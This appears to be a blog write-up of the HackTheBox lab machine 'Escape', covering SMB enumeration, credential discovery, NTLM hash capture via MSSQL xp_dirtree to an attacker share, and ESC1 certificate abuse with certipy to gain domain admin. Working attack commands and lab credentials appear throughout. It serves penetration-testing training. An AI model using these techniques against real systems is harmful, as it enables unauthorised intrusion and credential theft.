---
title: "HTB: Escape"
date: 2026-05-22
draft: false
tags:
  - htb
  - windows
  - medium
  - smb
  - active-directory
  - credential-reuse
  - pass-the-hash
  - adcs
  - esc1
  - evil-winrm
  - certipy
  - responder
  - impacket
  - write-up
  - oscp
description: "Escape is a Medium Windows Active Directory machine where a publicly readable SMB share leaks SQL Server credentials in a PDF. Those creds lead to MSSQL access, NTLM hash capture via xp_dirtree, and eventually an ESC1 ADCS attack to compromise the domain administrator."
ShowToc: true
cover:
  image: "/images/htb-escape/cover.png"
  alt: "HTB Escape machine cover"
---

## Machine Info

| Field      | Value                    |
|------------|--------------------------|
| Name       | Escape                   |
| Platform   | HackTheBox               |
| OS         | Windows                  |
| Difficulty | Medium                   |
| IP         | 10.129.228.253           |

## TL;DR

An unauthenticated SMB Public share exposes a PDF that contains SQL Server credentials. Connecting to MSSQL with those creds, we abuse `xp_dirtree` to capture the NTLMv2 hash of `sql_svc` via Responder and crack it with John. From there, SQL Server error logs left cleartext credentials for `Ryan.Cooper` lying around. As Ryan, certipy reveals an ESC1-vulnerable certificate template that allows anyone in Domain Users to request a cert on behalf of Administrator. One certificate later, we get the Administrator NT hash and land a SYSTEM shell via psexec.

## Recon

Standard nmap scan confirms this is a Windows DC:

```
nmap -sV -sC -p- --min-rate 5000 10.129.228.253
```

The key port is 1433 (MSSQL, SQL Server 2019) alongside the usual DC ports. The nmap output also leaks the domain: `sequel.htb`, hostname `dc`.

{{< figure src="/images/htb-escape/nmap-mssql.png" alt="nmap scan showing MSSQL on port 1433, domain sequel.htb" >}}

## Enumeration

### SMB - The PDF That Shouldn't Be There

Running nxc against SMB immediately shows something worth chasing: a `Public` share readable without authentication.

{{< figure src="/images/htb-escape/smb-enum.png" alt="nxc smb enumeration showing Public share with READ access" >}}

Spinning up `nxc`'s spider_plus module reveals a single file: `SQL Server Procedures.pdf`.

{{< figure src="/images/htb-escape/spider-plus.png" alt="nxc spider_plus output showing SQL Server Procedures.pdf in the Public share" >}}

A quick smbclient grab:

```
smbclient \\\\10.129.228.253\\Public -N
smb: \> get "SQL Server Procedures.pdf"
```

{{< figure src="/images/htb-escape/smbclient-get-pdf.png" alt="smbclient downloading SQL Server Procedures.pdf from Public share" >}}

Opening the PDF reveals a "Bonus" section for new hires - with a working database username and password:

{{< figure src="/images/htb-escape/pdf-creds.png" alt="PDF showing PublicUser credentials with password GuestUserCantWrite1" >}}

`PublicUser` / `GuestUserCantWrite1`. Someone thought putting creds in a guest-readable share was a good onboarding experience.

## Foothold

### MSSQL Access and NTLM Hash Capture

With credentials in hand, we connect to MSSQL using impacket-mssqlclient:

{{< figure src="/images/htb-escape/mssqlclient-connect.png" alt="impacket-mssqlclient connecting as PublicUser to sequel.htb SQL Server" >}}

Poking around the databases confirms we're a low-privileged guest - the notes say we can't enable `xp_cmdshell`. But there's another trick: `xp_dirtree`. This stored procedure makes the SQL Server reach out to a UNC path, triggering an NTLM authentication attempt that we can intercept.

First, let's look at what databases exist:

{{< figure src="/images/htb-escape/sql-databases.png" alt="SELECT name FROM sys.databases showing master, tempdb, model, msdb" >}}

{{< figure src="/images/htb-escape/sql-tables.png" alt="SQL query results showing tables in msdb and master databases" >}}

Nothing interesting in the data. But the auth capture path is wide open. Start Responder on your interface and trigger the connection:

```
EXEC master..xp_dirtree '\\10.10.14.2\share'
```

{{< figure src="/images/htb-escape/xp-dirtree.png" alt="EXEC master..xp_dirtree pointing to attacker SMB share" >}}

Responder catches the NTLMv2 hash for `sql_svc`:

{{< figure src="/images/htb-escape/responder-hash.png" alt="Responder capturing NTLMv2 hash for sql_svc" >}}

John cracks it almost instantly against rockyou:

{{< figure src="/images/htb-escape/john-crack.png" alt="John the Ripper cracking sql_svc hash to REGGIE1234ronnie" >}}

`sql_svc` : `REGGIE1234ronnie`.

### Getting a Shell as sql_svc

A quick WinRM check confirms `sql_svc` can log in:

{{< figure src="/images/htb-escape/winrm-sqlsvc.png" alt="nxc winrm showing sql_svc:REGGIE1234ronnie is Pwn3d" >}}

While exploring, we also enumerate domain users via SMB:

{{< figure src="/images/htb-escape/nxc-users.png" alt="nxc --users showing domain accounts including Ryan.Cooper, sql_svc, Tom.Henn" >}}

## Lateral Movement

### Credentials in the SQL Server Error Log

One of the first places worth checking on a Windows MSSQL host is `C:\SQLServer\Logs`. It's common for SQL Server to log failed authentication attempts - and sometimes those logs include the password that was accidentally typed into the username field.

```powershell
*Evil-WinRM* PS C:\SQLServer\Logs> dir
```

{{< figure src="/images/htb-escape/sqlserver-logs-dir.png" alt="Evil-WinRM showing ERRORLOG.BAK in C:\SQLServer\Logs" >}}

There's an `ERRORLOG.BAK`. Reading through it, we find a failed login attempt that gives the game away:

{{< figure src="/images/htb-escape/errorlog-creds.png" alt="SQL Server error log showing failed login for Ryan.Cooper with password NuclearMosquito3 visible" >}}

`Ryan.Cooper` tried to authenticate with `NuclearMosquito3` - and got it wrong the first time because they typed the password in the username field. Classic. SQL Server dutifully logged the "username" it received.

### WinRM as Ryan.Cooper

{{< figure src="/images/htb-escape/winrm-ryan.png" alt="nxc winrm showing Ryan.Cooper:NuclearMosquito3 is Pwn3d" >}}

{{< figure src="/images/htb-escape/evil-winrm-ryan.png" alt="Evil-WinRM shell as Ryan.Cooper" >}}

User flag:

{{< figure src="/images/htb-escape/user-flag.png" alt="user.txt flag on Ryan.Cooper's Desktop" >}}

## Privilege Escalation

### ESC1 - ADCS Certificate Template Abuse

With a domain user account, it's time to look at Active Directory Certificate Services. Certipy's `find` command scans for misconfigured templates:

```
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -vulnerable -stdout
```

{{< figure src="/images/htb-escape/certipy-find.png" alt="certipy-ad find command against sequel.htb" >}}

{{< figure src="/images/htb-escape/esc1-vulnerable.png" alt="certipy output showing ESC1 vulnerability in UserAuthentication template - enrollee supplies subject, Domain Users can enroll" >}}

The `UserAuthentication` template is vulnerable to **ESC1**: the template allows the enrollee to specify an arbitrary Subject Alternative Name (SAN), and it's configured for client authentication. Domain Users can enroll. This means any domain user can request a certificate that says it belongs to `administrator@sequel.htb`.

The attack:
1. Request a certificate with `administrator@sequel.htb` as the UPN
2. Use that cert to authenticate and get the Administrator's TGT and NT hash

```
certipy-ad req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
```

{{< figure src="/images/htb-escape/certipy-req.png" alt="certipy-ad req successfully requesting certificate with administrator UPN" >}}

Before authenticating, sync the clock with the DC to avoid Kerberos timestamp errors:

```
sudo ntpdate 10.129.228.253
```

Then authenticate with the certificate to get the NT hash:

{{< figure src="/images/htb-escape/certipy-auth.png" alt="certipy-ad auth using administrator.pfx to retrieve NT hash for administrator" >}}

With the Administrator hash, psexec gets us a SYSTEM shell:

{{< figure src="/images/htb-escape/psexec-root.png" alt="impacket-psexec shell as NT AUTHORITY\SYSTEM, root.txt flag visible" >}}

## Takeaways

- **Credentials in public shares**: A guest-readable SMB share with a PDF containing database credentials is a straightforward but surprisingly common misconfiguration. Always check anonymous/guest SMB access early in enumeration.
- **xp_dirtree for NTLM capture**: When you have MSSQL access but can't run `xp_cmdshell`, `xp_dirtree` is the next thing to reach for. It forces a UNC path resolution that Responder can intercept.
- **SQL Server error logs**: MSSQL logs failed login attempts including the "username" field - which often contains the password when someone accidentally swaps them. `C:\SQLServer\Logs\` is always worth checking.
- **ESC1 in ADCS**: Any template where Domain Users can enroll, the enrollee controls the SAN, and the template allows client authentication is ESC1. Certipy makes the identification and exploitation trivial - it's a go-to privesc path in AD environments with ADCS.
- **Clock sync before Kerberos**: `certipy-ad auth` uses Kerberos, which has a 5-minute clock skew tolerance. `ntpdate` against the DC before authenticating saves a frustrating error.

## References

- [Certipy - ESC1 explained](https://github.com/ly4k/Certipy)
- [HackTricks - MSSQL xp_dirtree NTLM relay](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [SpecterOps - Certified Pre-Owned (ADCS attacks)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
